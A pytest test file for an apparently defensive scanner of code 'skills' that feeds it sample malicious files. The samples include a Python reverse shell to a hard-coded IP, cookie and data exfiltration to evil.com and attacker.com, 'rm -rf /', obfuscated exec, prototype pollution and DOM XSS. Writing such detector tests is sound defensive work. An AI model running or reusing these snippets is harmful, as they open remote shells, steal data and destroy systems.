"""
Test cases for the scanner module
"""

import pytest
import tempfile
from pathlib import Path

from openclaw_shield.scanner import SkillScanner
from openclaw_shield.config import Config


class TestSkillScanner:
    """Test cases for SkillScanner"""

    def setup_method(self):
        """Setup before each test"""
        self.config = Config()

    def test_scan_safe_python_code(self, tmp_path):
        """Test scanning safe Python code"""
        safe_file = tmp_path / "safe.py"
        safe_file.write_text("""
import os
from pathlib import Path

def greet(name):
    return f"Hello, {name}!"

def process_file(file_path):
    path = Path(file_path)
    if path.exists():
        with open(path, 'r') as f:
            return f.read()
    return None

class DataProcessor:
    def __init__(self, config):
        self.config = config

    def process(self, data):
        return data.upper()
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(safe_file))

        assert result is not None
        assert result['file'] == str(safe_file)
        assert result['passed'] == True  # 安全代码应该通过
        assert len(result['threats']) == 0

    def test_scan_malicious_code_execution(self, tmp_path):
        """Test scanning code with code execution threats"""
        malicious_file = tmp_path / "malicious.py"
        malicious_file.write_text("""
import os

# Malicious: code execution using user input
user_input = input("Enter command: ")
os.system(user_input)

# Malicious: eval usage
code = "__import__('os').system('ls')"
eval(code)

# Malicious: exec usage
exec("import os; os.system('pwd')")
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(malicious_file))

        assert result is not None
        assert result['passed'] == False
        # 应该检测到代码执行威胁
        threat_types = [t.get('type') for t in result['threats']]
        assert 'code_execution' in threat_types or 'dangerous_function' in threat_types

    def test_scan_reverse_shell_pattern(self, tmp_path):
        """Test scanning reverse shell pattern"""
        shell_file = tmp_path / "shell.py"
        shell_file.write_text("""
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('185.220.101.1', 4444))
subprocess.Popen(['/bin/sh'], stdin=s.fileno(), stdout=s.fileno())
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(shell_file))

        assert result is not None
        assert result['passed'] == False
        # 应该检测到网络连接和反向 Shell
        threat_types = [t.get('type') for t in result['threats']]
        assert 'reverse_shell' in threat_types or 'suspicious_connection' in threat_types

    def test_scan_api_key_leak(self, tmp_path):
        """Test scanning API key leakage"""
        leak_file = tmp_path / "leak.py"
        leak_file.write_text("""
# API keys hardcoded - security risk
OPENAI_API_KEY = "sk-1234567890abcdefghijklmnop"
AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"
GITHUB_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"

def make_request():
    import requests
    headers = {"Authorization": f"Bearer {OPENAI_API_KEY}"}
    return requests.get("https://api.example.com", headers=headers)
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(leak_file))

        assert result is not None
        # 应该检测到凭证相关威胁
        threat_types = [t.get('type') for t in result['threats']]
        assert 'credential_theft' in threat_types

    def test_scan_base64_obfuscation(self, tmp_path):
        """Test scanning Base64 obfuscated code"""
        obfuscated_file = tmp_path / "obfuscated.py"
        obfuscated_file.write_text("""
import base64

# Obfuscated malicious code
encoded = "aW1wb3J0IG9zCm9zLnN5c3RlbSgnbHMnKQ=="
decoded = base64.b64decode(encoded).decode()
exec(decoded)
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(obfuscated_file))

        assert result is not None
        assert result['passed'] == False
        # 应该检测到混淆和代码执行
        threat_types = [t.get('type') for t in result['threats']]
        assert 'base64_decoding' in threat_types or 'code_execution' in threat_types

    def test_scan_environment_access(self, tmp_path):
        """Test scanning environment variable access"""
        env_file = tmp_path / "env.py"
        env_file.write_text("""
import os

# Accessing environment variables - potentially suspicious
api_key = os.environ.get('API_KEY')
password = os.getenv('PASSWORD')
all_env = os.environ.copy()
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(env_file))

        assert result is not None
        # 应该检测到环境变量访问
        threat_types = [t.get('type') for t in result['threats']]
        assert 'environment_access' in threat_types or 'env_variable_access' in threat_types

    def test_javascript_with_eval(self, tmp_path):
        """Test scanning JavaScript with eval"""
        js_file = tmp_path / "eval.js"
        js_file.write_text("""
// JavaScript with eval - dangerous
function dangerousEval(userInput) {
    eval(userInput);  // Code injection risk
}

// Function constructor - also dangerous
const dangerousFunc = new Function('return malicious code');
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(js_file))

        assert result is not None
        assert result['passed'] == False
        assert len(result['threats']) > 0

    def test_javascript_with_external_request(self, tmp_path):
        """Test scanning JavaScript with external requests"""
        js_file = tmp_path / "request.js"
        js_file.write_text("""
// External HTTP request - potential data exfiltration
fetch('http://evil.com/steal?data=' + document.cookie);

// Alternative way
const xhr = new XMLHttpRequest();
xhr.open('GET', 'http://malicious-server.com');
xhr.send();
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(js_file))

        assert result is not None
        # 应该检测到外部请求
        threat_types = [t.get('type') for t in result['threats']]
        assert 'external_request' in threat_types

    def test_javascript_prototype_pollution(self, tmp_path):
        """Test scanning JavaScript for prototype pollution"""
        js_file = tmp_path / "pollution.js"
        js_file.write_text("""
// Prototype pollution vulnerability
function merge(obj1, obj2) {
    for (let key in obj2) {
        obj1[__proto__][key] = obj2[key];
    }
}

// Another pattern
userInput.__proto__.isAdmin = true;
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(js_file))

        assert result is not None
        # 应该检测到原型污染
        threat_types = [t.get('type') for t in result['threats']]
        assert 'prototype_pollution' in threat_types

    def test_javascript_dom_xss(self, tmp_path):
        """Test scanning JavaScript for DOM XSS"""
        js_file = tmp_path / "xss.js"
        js_file.write_text("""
// DOM XSS risk
function displayUserInput(input) {
    document.getElementById('output').innerHTML = input;
    document.body.outerHTML = input;
    document.write(input);
}
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(js_file))

        assert result is not None
        # 应该检测到 DOM XSS
        threat_types = [t.get('type') for t in result['threats']]
        assert 'dom_xss' in threat_types

    def test_scan_directory(self, tmp_path):
        """Test scanning a directory of files"""
        # Create test files
        (tmp_path / "safe.py").write_text("x = 1")
        (tmp_path / "malicious.py").write_text("eval('evil code')")
        (tmp_path / "data.txt").write_text("not a python file")
        (tmp_path / "script.js").write_text("eval('x')")

        scanner = SkillScanner(self.config)
        result = scanner.scan_directory(str(tmp_path))

        assert result is not None
        assert result['files_scanned'] == 3  # 2 Python + 1 JS
        assert result['total_threats'] > 0
        assert result['directory'] == str(tmp_path)

    def test_scan_file_not_found(self):
        """Test scanning non-existent file"""
        scanner = SkillScanner(self.config)
        result = scanner.scan_file("/non/existent/file.py")

        assert result is not None
        assert 'error' in result
        assert 'not found' in result['error'].lower()

    def test_score_calculation(self, tmp_path):
        """Test security score calculation"""
        file_with_threats = tmp_path / "threats.py"
        file_with_threats.write_text("""
import os
eval('code')
exec('more code')
os.system('ls')
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(file_with_threats))

        assert result is not None
        assert result['score'] < 100  # 有威胁时分数应该降低
        assert result['score'] >= 0  # 分数不应该为负
        assert result['passed'] == False  # 低分数应该失败

    def test_imports_tracking(self, tmp_path):
        """Test that imports are properly tracked"""
        imports_file = tmp_path / "imports.py"
        imports_file.write_text("""
import os
import sys
import subprocess
from pathlib import Path
import socket as sock
from collections import defaultdict
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(imports_file))

        assert result is not None
        assert len(result['imports']) == 6
        assert 'os' in result['imports']
        assert 'sys' in result['imports']
        assert 'subprocess' in result['imports']
        assert 'pathlib' in result['imports']

    def test_dangerous_import_detection(self, tmp_path):
        """Test detection of dangerous imports"""
        dangerous_file = tmp_path / "dangerous.py"
        dangerous_file.write_text("""
import subprocess
import pickle
import marshal
import ctypes
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(dangerous_file))

        assert result is not None
        assert result['passed'] == False
        # 危险导入应该被检测到
        threat_types = [t.get('type') for t in result['threats']]
        assert 'dangerous_import' in threat_types

    def test_file_destruction_patterns(self, tmp_path):
        """Test detection of file destruction patterns"""
        destruct_file = tmp_path / "destruct.py"
        destruct_file.write_text("""
import os
import shutil

# Dangerous file operations
os.system('rm -rf /')
shutil.rmtree('/important/path')
os.remove('/etc/passwd')
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(destruct_file))

        assert result is not None
        assert result['passed'] == False

    def test_data_exfiltration_patterns(self, tmp_path):
        """Test detection of data exfiltration patterns"""
        exfil_file = tmp_path / "exfil.py"
        exfil_file.write_text("""
import socket
import requests

# Potential data exfiltration
s = socket.socket()
s.connect(('evil.com', 80))
s.send(stolen_data)

requests.post('http://attacker.com', data=sensitive_info)
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(exfil_file))

        assert result is not None
        threat_types = [t.get('type') for t in result['threats']]
        # 应该检测到数据外传或可疑连接
        assert any(t in threat_types for t in ['data_transmission', 'suspicious_connection', 'external_request'])

    def test_dynamic_import_detection(self, tmp_path):
        """Test detection of dynamic imports"""
        dynamic_file = tmp_path / "dynamic.py"
        dynamic_file.write_text("""
# Dynamic import - suspicious
module = __import__('os')
func = getattr(module, 'system')
func('ls')
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(dynamic_file))

        assert result is not None
        threat_types = [t.get('type') for t in result['threats']]
        assert 'dynamic_import' in threat_types or 'dynamic_attribute_access' in threat_types

    def test_hex_encoding_detection(self, tmp_path):
        """Test detection of hex encoded strings"""
        hex_file = tmp_path / "hex.py"
        hex_file.write_text(r"""
# Hex encoded strings - suspicious
evil = "\x48\x65\x6c\x6c\x6f"
code = "\x65\x78\x65\x63\x28\x27\x65\x76\x69\x6c\x27\x29"
""")

        scanner = SkillScanner(self.config)
        result = scanner.scan_file(str(hex_file))

        assert result is not None
        threat_types = [t.get('type') for t in result['threats']]
        assert 'hex_encoding' in threat_types or 'unicode_escape' in threat_types


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
